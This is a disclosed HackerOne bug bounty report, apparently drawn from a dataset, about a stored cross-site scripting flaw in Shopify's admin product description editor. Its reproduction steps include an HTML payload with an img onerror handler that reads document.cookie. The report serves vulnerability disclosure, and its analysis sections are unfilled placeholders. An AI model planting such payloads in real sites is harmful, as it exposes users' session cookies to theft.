---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '978125'
original_report_id: '978125'
title: xss triggered in "myshopify.com/admin/product"
team_handle: shopify
created_at: '2020-09-10T04:06:27.453Z'
disclosed_at: '2020-09-15T20:30:27.321Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 22
tags:
- hackerone
---

# xss triggered in "myshopify.com/admin/product"

## Metadata

- HackerOne Report ID: 978125
- Weakness: 
- Program: shopify
- Disclosed At: 2020-09-15T20:30:27.321Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

I tried to make a product description and add the xss script in the paragraph.

## steps for reproduction
1. create a new product
2. enter xss in the product description paragraph, such as;
`<div align =" center "data-mce-fragment =" 1 "> <img src = x onerror = prompt (document.cookie)>
<h4 dir = "ltr" data-mce-fragment = "1"> <span style = "text-decoration: underline; color: # ff2a00;"> <em> <strong> (name_product) </strong></em></span> </h4>
</div> ``

## Impact

xss can be triggered

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
